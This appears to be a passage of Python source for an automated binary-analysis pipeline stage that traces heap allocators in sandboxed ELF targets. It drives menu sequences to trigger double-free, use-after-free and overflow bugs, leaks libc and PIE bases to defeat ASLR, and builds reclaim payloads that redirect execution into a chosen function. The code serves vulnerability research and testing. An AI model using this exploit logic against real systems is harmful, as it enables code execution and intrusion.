    """Is this target position-independent? From the target row when TRIAGE has filled it in, and
    from the ELF header when it has not.

    PIE decides whether every breakpoint is rebased to the load base, so getting it wrong
    mis-places all of them and the stage reports "no heap primitive surfaced" -- a clean bill of
    health from a tracer that never stopped anywhere. `mitigations` comes from triage, so a
    heap_trace that runs before it read `pie=False` for a PIE binary **[measured: 22 sequences
    driven, not one alloc or free event]**. The header is right there, and the mitigation parser
    already in the tree reads it.
    """
    mit = getattr(target, "mitigations", None) or {}
    if "pie" in mit:
        return mit.get("pie") == "on"
    from .. import elf as _elf
    try:
        return _elf.parse(Path(exe).read_bytes()).elf_type == "dyn"
    except Exception:                                    # noqa: BLE001 -- advisory
        return False


def _add_free_ops(model: dict, opts: list):
    """(add, free) menu options, WITHOUT needing a view option, or None.

    `identify_heap_ops` needs all three roles because the output oracle reads a chunk back
    through `view`. The tracer's oracle reads memory directly, so a target with no view -- which
    is most of them -- still has a reclaim sequence worth driving, and this is the weaker lookup
    that finds it. Picking a view op as `free` by mistake simply means nothing is freed and no
    reclaim is observed; it cannot fabricate one.
    """
    if not (model and opts):
        return None
    add = next((o for o in opts if o in model and menu._is_alloc(model[o])), None)
    free = next((o for o in opts if o in model and model[o] == ["idx"] and o != add), None)
    return (add, free) if (add and free) else None


def _reclaim_sequence(model: dict, opts: list, width, marker: bytes, size: int = 0x80):
    """`add(victim); add(guard); free(victim); add(attacker, MARKER)` for the TRACER to watch.

    Built from the crawled model so the fields are typed as the target expects, which is why it
    cannot live in `heaptrace.heap_op_sequences` -- that generator is a static guess used only
    when the crawl learned nothing, so the reclaim shape there was never driven against a target
    whose crawl DID work, which is most of them **[measured: the shape existed and never ran]**.
    """
    ops = _add_free_ops(model, opts)
    if not ops:
        return None
    add, free = ops
    w = (_op_writes(add, model[add], width, idx=0, size=size, data=b"P" * 8)
         + _op_writes(add, model[add], width, idx=1, size=size, data=b"G" * 8)
         + _op_writes(free, model[free], width, idx=0)
         + _op_writes(add, model[add], width, idx=2, size=size, data=marker)
         # One more allocation, whose only job is to give the tracer a STOP after the marker has
         # been written. The fill is the read() that follows the reclaiming malloc, so a sequence
         # that ends at that malloc leaves the tracer nowhere to look: by the time the run is
         # over the tracee has exited and its memory cannot be read **[measured: the reclaim was
         # seen and the marker never was]**.
         + _op_writes(add, model[add], width, idx=3, size=size, data=b"Z" * 8))
    # THE READING HALF. Everything above shows the attacker's bytes sitting in the dead object;
    # none of it shows the program touching them. So drive every OTHER option that takes an index
    # against the VICTIM's index, after the reclaim: whichever one uses a stored object reads the
    # attacker's bytes through a pointer the program should have stopped using, and the tracer's
    # read watchpoint is armed on that chunk by then. An option that does something else is a few
    # wasted writes; an option that frees it again is a double free the tracer reports anyway.
    for other in opts:
        if other in (add, free) or other not in model:
            continue
        if model[other][:1] != ["idx"]:
            continue
        w += _op_writes(other, model[other], width, idx=0)
    return b"".join(w)


def _try_reclaim_exec(ctx, target, target_bytes, exe, workdir, helper, model, opts, width,
                      alloc, plt_mode, pie, edges, observation, load_base, leak=None):
    """Drive the demonstrated hijack to CODE EXECUTION: put a chosen function's address in the
    reclaim payload instead of the sentinel, and watch for arrival at it.

    Everything up to here shows the attacker choosing the bytes a dead object's function pointer
    is read from, and the program calling through them. It stops at a fault because the sentinel
    is deliberately unmappable. The remaining question is the one an operator actually asks --
    *so what?* -- and it is answered by substituting a REAL address in bytes already shown to be
    attacker-controlled, and breakpointing it: the program either arrives there or it does not.

    The target comes from `exploit.find_win`, which is deliberately strict and documents why:
    redirecting into a function the program calls anyway is a much weaker claim than the badge
    implies. No win function, no claim -- the hijack stands on its own.

    Returns the arrival event or None. Honest limits, carried into the text by the caller: the
    address is absolute, and it is only knowable here because this tracer disables ASLR; against
    a live PIE target the same step needs a leak, which is a different capability.
    """
    import json as _json
    import struct as _struct

    from ..poc import exploit as _exploit
    funcs = _exploit.elf_functions(target_bytes) or {}
    name, vaddr = _exploit.find_win(funcs, call_edges=edges)
    if not (name and vaddr):
        return None
    # WHERE THE ADDRESS COMES FROM, which is the whole difference between a demonstration that
    # depends on ASLR being off and one that does not. A leak that recovered the IMAGE base gives
    # the same number from the target's own output, so prefer it -- and cross-check it against
    # the base the tracer measured, because two independent routes to one number is the only way
    # to show the leaked one is right rather than merely present.
    leaked = int((leak or {}).get("pie_base") or 0) or None
    traced = int(load_base or 0) or None
    base, source = (traced, "tracer (ASLR off)")
    agree = None
    if pie and leaked:
        agree = (traced is None or leaked == traced)
        if agree:
            base, source = (leaked, "leaked at runtime")
    runtime = (int(base or 0) + int(vaddr)) if pie else int(vaddr)
    # The payload sits where the pointer the program CALLED was read from, which the hijack
    # evidence already names -- not at offset 0 by assumption.
    at = int(observation.get("offset") or 0)
    payload = b"A" * at + _struct.pack("<Q", runtime)
    seq = _reclaim_sequence(model, opts, width, payload)
    if not seq:
        return None
    ctx.progress(msg=f"hijack demonstrated: aiming it at {name} ({hex(runtime)}) to see whether "
                     f"the program executes it")
    spec, report = workdir / "spec_exec.json", workdir / "report_exec.json"
    report.unlink(missing_ok=True)
    spec.write_text(_json.dumps({
        "exe": str(exe), "stdin": seq.hex(), "free_off": alloc["free"],
        "alloc_off": alloc["alloc"], "alloc_ret_offs": [], "pie": pie,
        "alloc_is_plt": plt_mode, "ignore_ranges": [], "exec_target": int(vaddr),
        "report": str(report), "timeout": 8}))
    cmd = (sandbox.isolate_prefix(str(workdir), net=False, rw_binds=[str(workdir)])
           + ["python3", str(helper), str(spec), str(report)])
    try:
        sandbox.run_reaped(cmd, timeout=15, capture_output=True, cwd=str(workdir),
                           preexec_fn=sandbox._rlimits(2048, 20, set_as=False))
        rep = _json.loads(report.read_text())
    except Exception:
        return None
    hit = next(iter(rep.get("reclaim_exec") or []), None)
    if not hit:
        return None
    return {"function": name, "addr": hex(runtime), "vaddr": hex(int(vaddr)),
            "returns_to": hit.get("returns_to"),
            "addr_source": source,
            "leaked_base": (hex(leaked) if leaked else None),
            "traced_base": (hex(traced) if traced else None),
            "bases_agree": agree,
            "aslr": ("not relied on -- the base was disclosed by the target"
                     if source == "leaked at runtime" else "off (tracer)")}


def _file_traced_reclaim(ctx, target, alloc, observation):
    """File a reclaim the TRACER demonstrated, for a target with no output oracle.

    Separate from `_try_uaf_reclaim` because the evidence is different in kind and the claim is
    weaker in a specific way the text has to carry: the output route shows the program READING
    the attacker's bytes back through the stale pointer, and this one shows only that the bytes
    are in the chunk. Both are reclaim; only one of them includes a use.
    """
    import json as _json

    from ...db.dao import FindingDAO
    from ..poc import primitive as _prim
    hit = _prim.reclaim_verdict_traced(observation)
    if not hit:
        return None
    effect = _prim.reclaim_effect(hit)
    detail = (f"Reclaim observed by the allocator tracer on {alloc['alloc_name']}/"
              f"{alloc['free_name']}: the chunk at {hit.get('addr')} was freed, handed back out "
              f"to a later allocation, and the marker bytes that allocation carried were read "
              f"out of the process's memory at offset {hit.get('chunk_offset')}. The same chunk "
              f"was sampled before the free and did not contain them."
              + (f" The program then READ that chunk from its own code at pc "
                 f"{hit.get('use_pc')}." if hit.get("used") else "")
              + ((f" It then executed an indirect call/jump through "
                  f"`{hit.get('effect_via')}`, which held those bytes, and faulted at "
                  f"{hit.get('effect_pc')}." if hit.get("effect_via") else
                  f" It then faulted with the instruction pointer set to those bytes "
                  f"({hit.get('effect_pc')}).")
                 if hit.get("effect_kind") == "control-flow-hijack" else
                 f" It then faulted touching the address those bytes spell "
                 f"({hit.get('effect_fault_addr')})."
                 if hit.get("effect_kind") == "dereference" else "")
              + f" {effect}")
    ctx.emit("heaptrace.reclaim", payload={
        "type": hit["type"], "oracle": "traced-memory", "confirmed": True,
        "size": hit.get("size"), "addr": hit.get("addr"), "used": hit.get("used"),
        "use_pc": hit.get("use_pc"), "effect_kind": hit.get("effect_kind"),
        "effect_pc": hit.get("effect_pc"),
        "chunk_offset": hit.get("chunk_offset"), "allocator": alloc["alloc_name"]})
    _proof = {"exec_function": hit.get("exec_function"), "exec_addr": hit.get("exec_addr"),
              "type": "uaf-reclaim-traced", "addr": hit.get("addr"),
              "offset": hit.get("chunk_offset"), "size": hit.get("size"),
              "marker": hit.get("marker"), "use_pc": hit.get("use_pc"),
              "effect_kind": hit.get("effect_kind"), "effect_pc": hit.get("effect_pc"),
              "effect_fault_addr": hit.get("effect_fault_addr"),
              "effect_via": hit.get("effect_via")}
    if hit.get("executed"):
        # Code execution, observed at the target. RCE is DEMONSTRATED here and not potential --
        # the program ran a function the analysis picked -- while the text keeps the two limits
        # that matter: it is a redirect into existing code, and the address came from a fixed
        # load base because this tracer disables ASLR.
        eff = [{"kind": "rce",
                "title": (f"Code execution through a reclaimed freed object: "
                          f"{hit.get('exec_function')} (demonstrated)"),
                "status": "demonstrated", "detail": detail, "proof": _proof},
               {"kind": "control-flow-hijack",
                "title": "Control-flow hijack through a reclaimed freed object (demonstrated)",
                "status": "demonstrated", "detail": detail, "proof": _proof}]
    elif hit.get("effect_kind") == "control-flow-hijack":
        # The instruction pointer became the attacker's own bytes. That is a hijack, which is a
        # different effect KIND from "the contents are attacker-controlled" -- and RCE rides
        # along as POTENTIAL for the same reason `poc_primitive` does it: the flow is hijacked,
        # no attacker code has run, and the landing address here is unmapped on purpose.
        eff = [{"kind": "control-flow-hijack",
                "title": "Control-flow hijack through a reclaimed freed object (demonstrated)",
                "status": "demonstrated", "detail": detail, "proof": _proof},
               {"kind": "rce", "title": "Remote code execution", "status": "potential",
                "detail": "the hijacked flow lands on the sentinel, which is unmapped; a chosen "
                          "target and a payload are the exploit stage's work"}]
    else:
        eff = [{"kind": "memory-corruption",
                "title": ("Attacker-controlled pointer DEREFERENCED from a freed object "
                          "(demonstrated)" if hit.get("effect_kind") == "dereference" else
                          "Attacker-controlled contents READ from a freed object (demonstrated)"
                          if hit.get("used") else
                          "Attacker-controlled contents in a freed object (demonstrated)"),
                "status": "demonstrated", "detail": detail, "proof": _proof}]
    FindingDAO(ctx.conn).upsert(target.id, target.case_id, {
        "cwe": "CWE-416",
        "title": (f"Use-after-free: reclaimed object redirects execution into "
                  f"{hit.get('exec_function')}" if hit.get("executed") else
                  "Use-after-free: reclaimed object's bytes CALLED as a function pointer"
                  if hit.get("effect_kind") == "control-flow-hijack" else
                  "Use-after-free: reclaimed object's bytes DEREFERENCED as a pointer"
                  if hit.get("effect_kind") == "dereference" else
                  "Use-after-free: attacker bytes reclaimed AND read (traced)" if hit.get("used")
                  else "Use-after-free with a demonstrated reclaim (traced)"),
        "severity": "critical", "detector": "heap_trace", "state": "corroborated",
        "confidence": 0.9,
        "dedup_key": f"CWE-416:uaf-reclaim:{alloc['free_name']}",
        "function_addr": alloc["free"], "site_addr": None, "site_detail": alloc["free_name"],
        "evidence": [{"channel": "effects", "detail": _json.dumps(eff)},
                     {"channel": "heap-trace", "detail": detail}]})
    ctx.progress(msg=f"reclaim demonstrated by the tracer at {hit.get('addr')} "
                     f"(no output oracle needed)")
    return {"metrics": {"reclaim": "demonstrated", "reclaim_oracle": "traced-memory",
                        "reclaim_used": bool(hit.get("used")),
                        "reclaim_effect": hit.get("effect_kind"),
                        "reclaim_exec": hit.get("exec_function") or None}}


def _try_uaf_leak(ctx, target, target_bytes, exe, workdir, model, opts, width, alloc):
    """Discover + file a use-after-free READ leak: a notebook whose Show-after-Remove prints a freed
    chunk discloses a libc/heap pointer WITHOUT faulting, so the watchpoint tracer never sees it.
    Files a CWE-416 finding (detector heap_trace, so chain_primitive's _lead_finding consumes it)
    carrying a DEMONSTRATED info-disclosure effect + the recovered base. Returns a metrics dict on a
    hit, else None. Best-effort: self-gates to a target with a real add/free/view menu."""
    import json as _json

    from ...db.dao import FindingDAO
    from ..poc import heap as _heap
    if not (opts and model):
        return None
    ops = identify_heap_ops(workdir, exe, model, opts, width)
    if not ops:
        return None
    # the bundled libc staged beside the target (stage_target put deps under workdir), for the
    # unsorted-bin offset and the leak classifier -- NOT the host libc.
    libc_path = next((p for p in Path(workdir).rglob("libc*.so*") if p.is_file()), None)
    libc_data = libc_path.read_bytes() if libc_path else b""
    # The main_arena offset the unsorted-bin fd discloses. A bundled libc is measured directly; with
    # NO bundled libc the target runs against the HOST glibc (this is a native x86-64-only stage), so
    # the host main_arena offset is the correct one -- the fd points at THIS process's arena. The
    # page-aligned subtraction guard in heap_uaf_leak still rejects a wrong offset (a static or
    # foreign binary), so the host fallback recovers a real libc leak and never fabricates one;
    # without it a no-bundled-libc target could only ever disclose a heap pointer.
    unsorted_off = 0
    try:
        unsorted_off = int(_heap.unsorted_bin_offset(str(libc_path) if libc_path else None) or 0)
    except Exception:
        unsorted_off = 0
    # The tcache-fill strategy drives ~18 menu ops (9 creates + 8 frees + a Show), each with a
    # prompt drain, so it needs a generous budget -- 10s starved it mid-fill and the Show never ran.
    hit = heap_uaf_leak(workdir, exe, ops, model, width, target_bytes=target_bytes,
                        libc_data=libc_data, unsorted_off=unsorted_off, timeout=30.0)
    if not hit:
        return None
    base_hex = hex(hit["base"])
    what = {"libc": "libc base", "pie": "PIE image base", "heap": "heap pointer"}[hit["kind"]]
    detail = (f"Use-after-free READ: Show (option {ops['view']!r}) of an entry freed by option "
              f"{ops['free']!r} disclosed a {what} ({base_hex}) straight out of the freed chunk -- a "
              f"demonstrated memory disclosure that defeats ASLR and seeds a libc-target tcache poison "
              f"-> shell. Sequence: create -> remove -> show on the same index, {hit['size']:#x}-byte "
              f"chunk (an unsorted-bin chunk frees with a libc main_arena pointer).")
    eff = [{"kind": "info-disclosure", "title": f"UAF read leaks {what}", "status": "demonstrated",
            "detail": detail, "proof": {"type": "uaf-leak", "base": base_hex, "kind": hit["kind"],
                                        "view_op": ops["view"], "free_op": ops["free"],
                                        "add_op": ops["add"]}}]
    FindingDAO(ctx.conn).upsert(target.id, target.case_id, {
        "cwe": "CWE-416", "title": f"Use-after-free read discloses {what} (demonstrated)",
        "severity": "high", "detector": "heap_trace", "state": "corroborated", "confidence": 0.9,
        "dedup_key": f"CWE-416:uaf-leak:{alloc['free_name']}",
        "function_addr": alloc["free"], "site_addr": None, "site_detail": alloc["free_name"],
        "evidence": [{"channel": "effects", "detail": _json.dumps(eff)},
                     {"channel": "heap-trace", "detail": detail}]})
    ctx.emit("heaptrace.done", payload={
        "applicable": True, "double_free": False, "use_after_free": True, "heap_overflow": False,
        "allocator": alloc["alloc_name"], "uaf_leak": {"kind": hit["kind"], "base": base_hex,
                                                       "view_op": ops["view"]},
        "vuln": {"vclass": "uaf", "note": f"{alloc['alloc_name']}/{alloc['free_name']}",
                 "leak": {"kind": hit["kind"], "base": base_hex}}})
    ctx.progress(pct=100, msg=f"UAF read leaks {what} {base_hex} (demonstrated disclosure)")
    # The HIT travels with the metrics, not just a summary of it: the exec experiment needs the
    # recovered IMAGE base to build a code address that does not depend on ASLR being off, and
    # passing the metrics dict in its place quietly handed it `None` **[measured: the chain
    # reached code execution and reported "no disclosure here recovered the image base" while
    # this function had the base in hand]**.
    return {"metrics": {"applicable": True, "use_after_free": True, "uaf_leak": hit["kind"],
                        "base": base_hex},
            "leak": hit}


def _allocator_ranges(functions: dict, edges, alloc: dict) -> list[list[int]]:
    """[start, end) code ranges of the allocator FAMILY: alloc/free, everything they call
    transitively (a compacting allocator's insert_block/compact/memmove), and same-stem functions.
    A UAF watchpoint firing from inside this code is the allocator's own bookkeeping, not a program
    use-after-free, so the tracer ignores it."""
    if not functions:
        return []
    addrs = sorted(set(functions.values()))

    def _rng(a):
        nxt = next((x for x in addrs if x > a), a + 0x400)
        return [a, nxt]

    stem = re.sub(r"(alloc|free|new|delete|release|dealloc)\w*$", "",
                  alloc["alloc_name"].lstrip("_")).rstrip("_").lower()
    family = {alloc["alloc"], alloc["free"]}
    for name, addr in functions.items():
        if stem and name.split("@")[0].lstrip("_").lower().startswith(stem):
            family.add(addr)
    # transitive callees of alloc/free (compaction/bookkeeping helpers)
    adj: dict = {}
    for e in edges or []:
        try:
            src = int(str(e.src_addr), 16) if isinstance(e.src_addr, str) else int(e.src_addr)
        except (TypeError, ValueError):
            continue
        if e.dst_name in functions:
            adj.setdefault(src, set()).add(functions[e.dst_name])
    seen, queue = set(family), list(family)
    while queue:
        for callee in adj.get(queue.pop(), ()):
            if callee not in seen:
                seen.add(callee)
                queue.append(callee)
    return sorted(_rng(a) for a in seen)


def heap_trace_stage(ctx) -> dict:
    from ...db.dao import CallEdgeDAO, FindingDAO, StringDAO, TargetDAO
    target = TargetDAO(ctx.conn).get(ctx.target_id) if ctx.target_id else None
    if target is None:
        raise ValueError("heap_trace requires a target_id")
    host = sandbox.host_arch()
    if (substrate.foreign_cpu(target.arch, target.file_type, host)
            or (target.file_type or "").lower() not in ("elf", "")):
        ctx.emit("heaptrace.done", payload={"applicable": False,
                 "note": "custom-allocator tracing is native x86-64 / ELF only"})
        return {}

    # elf_functions gives name -> INT addr from the symbol table (the DAO stores hex strings);
    # a hand-rolled allocator is a NAMED local symbol, exactly what this reads.
    target_bytes = ctx.content.path(target.sha256).read_bytes()
    functions = exploit.elf_functions(target_bytes)
    edges = CallEdgeDAO(ctx.conn).list_by_target(target.id)
    strings = [x.value for x in StringDAO(ctx.conn).list_by_target(target.id)
               if getattr(x, "value", None)]
    # StringDAO is filled by the DISASSEMBLE stage; fall back to the shared interaction model's menu
    # (a direct byte scan) so detection does not depend on stage ordering AND matches the menu list
    # _looks_like_heap_menu gates on -- the crawler and the gate never disagree.
    from .. import interaction
    opts = menu.detect_menu(strings) or interaction.build_model(target_bytes).menu_opts
    alloc = heaptrace.identify_allocator(functions, edges)
    # A stripped target has no named allocator; if it is a menu-driven heap service we fall back to
    # tracing libc malloc/free directly (resolved from the PLT below, once the binary is on disk).
    if not alloc and not opts:
        ctx.emit("heaptrace.done", payload={"applicable": False,
                 "note": "no distinct custom allocator found (libc malloc/free is covered by "
                         "heap_check); nothing to trace"})
        ctx.progress(pct=100, msg="no custom allocator to trace")
        return {}

    workdir = Path(tempfile.mkdtemp(prefix="lykos-heaptrace-"))
    sandbox.protect_dir(getattr(ctx.content, "root", None))
    try:
        exe = workdir / "target.bin"
        ctx.content.stage_target(target, exe.parent, exe.name)
        os.chmod(exe, 0o755)
        helper = workdir / "heaptrace.py"
        helper.write_bytes(_HELPER.read_bytes())

        plt_mode = False
        if not alloc:                                    # symbol-free: trace the libc PLT stubs
            alloc = _libc_plt_pair(exe)
            if not alloc:
                ctx.emit("heaptrace.done", payload={"applicable": False,
                         "note": "no named custom allocator and no libc malloc/free to trace"})
                ctx.progress(pct=100, msg="no allocator to trace")
                return {}
            plt_mode = True

        pie = _pie_for(target, exe)
        # PLT mode has no local `ret` to read rax from and no local allocator family to exclude.
        ret_offs = [] if plt_mode else _alloc_ret_offsets(exe, alloc["alloc_name"])
        # Allocator-family code ranges (alloc/free + their callees + same-stem functions), so a UAF
        # watchpoint that fires from the allocator's own bookkeeping/compaction is not mis-reported.
        ignore_ranges = [] if plt_mode else _allocator_ranges(functions, edges, alloc)
        # Learn each option's typed field template (Name/Surname/Age/size/Note ...) by driving the
        # live process, so a rich add flow actually ALLOCATES -- the generic (option,size,data)
        # guess never would. menu_op_sequences builds correctly-typed op-sequences from it;
        # fall back to the generic shapes when crawling finds no allocator flow.
        # Fixed-width read(fd, buf, W) targets consume exactly W bytes per field (dreamdiary-style);
        # the crawl and the op-sequences must pad each field to W instead of newline-delimiting.
        width, model = shared_op_model(ctx, target, workdir, exe, opts)
        from ..poc import primitive as _prim
        seqs = menu.menu_op_sequences(model, opts, width=width) \
            or heaptrace.heap_op_sequences(opts, marker=_prim.RECLAIM_MARKER) or [
            b"1\n64\nA\n2\n0\n2\n0\n", b"1\n2\n2\n",                 # double-free
            b"1\n64\nA\n2\n0\n3\n0\n", b"1\n2\n3\n", b"1\n2\n3\n4\n",  # UAF (alloc, free, use)
            b"1\n2\n4\n", b"1\n64\nA\n2\n0\n4\n0\n",
            b"1\n16\nA\n2\n0\n" + b"B" * 128 + b"\n",               # heap overflow (over-long)
            b"1\n16\nA\n3\n0\n" + b"B" * 128 + b"\n"]
        # The reclaim shape goes FIRST: the loop below stops at the first sequence that faults,
        # and this one is four operations that also exercise alloc/free, so leading with it costs
        # the fault hunt nothing and is the only way the reclaim oracle sees anything on a target
        # that faults early.
        _rseq = _reclaim_sequence(model, opts, width, _prim.RECLAIM_MARKER)
        if _rseq:
            seqs = [_rseq] + [x for x in seqs if x != _rseq]
        ctx.emit("heaptrace.allocator", payload={
            "alloc": alloc["alloc_name"], "free": alloc["free_name"],
            "alloc_addr": hex(alloc["alloc"]), "free_addr": hex(alloc["free"]),
            "sequences": len(seqs)})
        ctx.progress(msg=f"tracing {alloc['alloc_name']}/{alloc['free_name']} over {len(seqs)} "
                         "operation sequences")

        found = None
        # The tracer's own half of the reclaim evidence, collected across every sequence: on a
        # target with no `view` option there is no oracle for the marker experiment below, and
        # "a later allocation was handed the freed chunk" is then the only reclaim evidence
        # available. Weaker than the marker proof (it says the chunk came back, not whose bytes
        # are in it) and worth reporting rather than discarding.
        reclaim_traced = False
        #: The first `reclaim-controlled` observation the tracer made: the attacker's bytes in a
        #: chunk that was handed back out, read from the process's own memory. This is what a
        #: target with NO `view` option has instead of the output oracle.
        reclaim_observed = None
        #: Where the image landed in the tracer (ASLR off, so deterministic). Needed to put a
        #: REAL code address in a reclaim payload.
        traced_base = 0
        for i, seq in enumerate(seqs):
            if ctx.should_cancel():
                break
            spec = workdir / "spec.json"
            report = workdir / "report.json"
            report.unlink(missing_ok=True)
            spec.write_text(json.dumps({
                "exe": str(exe), "stdin": seq.hex(), "free_off": alloc["free"],
                "alloc_off": alloc["alloc"], "alloc_ret_offs": ret_offs, "pie": pie,
                "alloc_is_plt": plt_mode,
                # The tracer samples a freed chunk before and after it is handed back out and
                # looks for these bytes. That is the ONLY reclaim oracle a target with no
                # printing path has: the marker experiment below needs a `view` option.
                "marker": _prim.RECLAIM_MARKER.hex(),
                "ignore_ranges": ignore_ranges, "report": str(report), "timeout": 8}))
            cmd = (sandbox.isolate_prefix(str(workdir), net=False, rw_binds=[str(workdir)])
                   + ["python3", str(helper), str(spec), str(report)])
            try:
                sandbox.run_reaped(cmd, timeout=15, capture_output=True, cwd=str(workdir),
                                   preexec_fn=sandbox._rlimits(2048, 20, set_as=False))
            except Exception:
                continue
            try:
                rep = json.loads(report.read_text())
            except Exception:
                continue
            reclaim_traced = reclaim_traced or bool(rep.get("reclaim"))
            if rep.get("load_base") and not traced_base:
                traced_base = int(str(rep["load_base"]), 16)
            for _rc in (rep.get("reclaim_controlled") or []):
                if not _rc.get("marker_before_free"):
                    if reclaim_observed is None:
                        reclaim_observed = dict(_rc)
                    # The read, if the tracer saw one on this chunk: the third fact, and the only
                    # one that shows a USE rather than a state of memory.
                    _use = next((u for u in (rep.get("reclaim_use") or [])
                                 if u.get("addr") == _rc.get("addr")), None)
                    if _use and not reclaim_observed.get("use"):
                        reclaim_observed["use"] = _use
                    # ...and WHAT it did with them. A hijack outranks a bare dereference, which
                    # outranks an unexplained fault, so the strongest observation in this run
                    # wins rather than whichever arrived first.
                    _rank = {"control-flow-hijack": 3, "dereference": 2, "fault": 1}
                    for _fx in (rep.get("reclaim_effect") or []):
                        _cur = reclaim_observed.get("effect") or {}
                        if _rank.get(_fx.get("kind"), 0) > _rank.get(_cur.get("kind"), 0):
                            reclaim_observed["effect"] = _fx
            if rep.get("double_free") or rep.get("use_after_free") or rep.get("heap_overflow"):
                found = (seq, rep)
                break

        # A use-after-free READ (Show-after-Remove prints a freed chunk's libc/heap pointer) never
        # faults, so the watchpoint tracer above cannot see it -- and it is a DISTINCT, higher-value
        # primitive than a crashing fault: the disclosure defeats ASLR and seeds a tcache-poison ->
        # shell. A double-free/overflow fault would otherwise MASK it (the tracer stops at the first
        # fault and returns), so attempt it UNCONDITIONALLY and file it alongside -- a notebook
        # commonly has both. Self-gates to an add/free/view menu, so it is a no-op elsewhere.
        leak_hit = None
        try:
            leak_hit = _try_uaf_leak(ctx, target, target_bytes, exe, workdir, model, opts,
                                     width, alloc)
        except Exception:
            leak_hit = None

        # The RECLAIM half, for the same reason and unconditionally: it is the step that turns a
        # use-after-free from "the program touched a dead chunk" into "the attacker chooses the
        # contents of an object the program still believes it owns", and it is invisible to every
        # other channel here -- the watchpoint tracer sees the use but not who filled the chunk,
        # and the sanitizer path cannot see it at all because ASan quarantines the chunk.
        # The exec experiment needs the leak's image base, so it runs after `_try_uaf_leak`
        # above and before the reclaim findings are filed -- its evidence belongs on whichever
        # of them this target produces.
        if (reclaim_observed or {}).get("effect", {}).get("kind") == "control-flow-hijack":
            try:
                _ex = _try_reclaim_exec(ctx, target, target_bytes, exe, workdir, helper,
                                        model, opts, width, alloc, plt_mode, pie, edges,
                                        reclaim_observed, traced_base,
                                        leak=(leak_hit or {}).get("leak"))
                if _ex:
                    reclaim_observed["exec"] = _ex
            except Exception:
                pass
        reclaim_hit = None
        try:
            reclaim_hit = _try_uaf_reclaim(ctx, target, exe, workdir, model, opts, width, alloc,
                                           traced=reclaim_observed)
        except Exception:
            reclaim_hit = None
        # No `view` option, so no output oracle -- which is most targets. The tracer read the
        # chunk instead, and that evidence is filed by the same route so a silent target is not
        # left with "the chunk came back" and nothing more.
        if reclaim_hit is None and reclaim_observed:
            try:
                reclaim_hit = _file_traced_reclaim(ctx, target, alloc, reclaim_observed)
            except Exception:
                reclaim_hit = None

        if not found:
            if leak_hit:
                if reclaim_hit:
                    leak_hit.setdefault("metrics", {}).update(reclaim_hit.get("metrics", {}))
                return leak_hit
            if reclaim_hit:
                return reclaim_hit
            ctx.emit("heaptrace.done", payload={
                "applicable": True, "double_free": False, "use_after_free": False,
                "heap_overflow": False, "allocator": alloc["alloc_name"],
                "reclaim_traced": reclaim_traced,
                "note": (f"traced the target's own allocator ({alloc['alloc_name']}/"
                         f"{alloc['free_name']}) over {len(seqs)} operation sequences; no "
                         "double-free, use-after-free or heap overflow surfaced. Menu semantics "
                         "may need analyst-supplied op sequences.")})
            ctx.progress(pct=100, msg="no heap primitive surfaced on the custom allocator")
            return {"metrics": {"applicable": True, "double_free": False}}

        seq, rep = found
        input_sha = ctx.put_artifact("heap-op-sequence", data=seq)
        if rep.get("double_free"):
            _cwe, _title, _kind, _why = ("CWE-415", "Double free", "double_free",
                                         "freed a chunk that was already free")
        elif rep.get("use_after_free"):
            _cwe, _title, _kind, _why = ("CWE-416", "Use-after-free", "uaf",
                                         "read/wrote a chunk after it was freed")
        else:
            _cwe, _title, _kind, _why = ("CWE-122", "Heap-based buffer overflow", "heap_overflow",
                                         "wrote past the end of an allocated chunk")
        _seeds = ("Corrupts the adjacent chunk's header -> allocator metadata attack"
                  if _kind == "heap_overflow" else "Seeds tcache poisoning -> arbitrary write")
        _rc = (" The tracer also saw the freed chunk handed back out to a LATER allocation, so "
               "the reuse this class of attack needs happens here (what the later allocation "
               "put in it is a separate question -- see the reclaim experiment)."
               if reclaim_traced and _kind != "heap_overflow" else "")
        detail = (f"{_title} ({_cwe}) discovered on the target's own allocator "
                  f"{alloc['alloc_name']}/{alloc['free_name']}: the traced sequence {_why}. "
                  f"{_seeds}.{_rc} (op sequence {input_sha[:12]})")
        FindingDAO(ctx.conn).upsert(target.id, target.case_id, {
            "cwe": _cwe, "title": _title, "severity": "high" if _kind == "double_free" else "critical",
            "detector": "heap_trace", "state": "corroborated", "confidence": 0.85,
            "dedup_key": f"{_cwe}:heaptrace:{alloc['free_name']}",
            "function_addr": alloc["alloc"] if _kind == "heap_overflow" else alloc["free"],
            "site_addr": None,
            "site_detail": alloc["alloc_name"] if _kind == "heap_overflow" else alloc["free_name"],
            "evidence": [{"channel": "heap-trace", "detail": detail}]})
        ctx.emit("heaptrace.done", payload={
            "applicable": True, "double_free": _kind == "double_free", "use_after_free": _kind == "uaf",
            "heap_overflow": _kind == "heap_overflow", "reclaim_traced": reclaim_traced,
            "allocator": alloc["alloc_name"], "input_sha": input_sha,
            # the aaheg chainer consumes this Vuln shape (double_free/uaf -> tcache-poison chain)
            "vuln": {"vclass": _kind, "note": f"{alloc['alloc_name']}/{alloc['free_name']}"}})
        ctx.progress(pct=100, msg=f"{_title.lower()} discovered on {alloc['free_name']}")
        metrics = {_kind: True}
        if leak_hit:                                     # a fault AND a UAF-read disclosure both fired
            metrics.update(leak_hit.get("metrics", {}))
        if reclaim_hit:                                  # ...and the reclaim: a third thing
            metrics.update(reclaim_hit.get("metrics", {}))
        return {"metrics": metrics, "output_shas": [input_sha]}
    finally:
        shutil.rmtree(workdir, ignore_errors=True)


def register() -> None:
    register_stage(HEAP_TRACE_STAGE, heap_trace_stage, resource_class="cpu",
                   tool="ptrace", tool_version="1")


def enqueue_heap_trace(queue, target, *, params=None, force: bool = True):
    return queue.enqueue(target.case_id, HEAP_TRACE_STAGE, target_id=target.id,
                         params=params or {}, force=force)
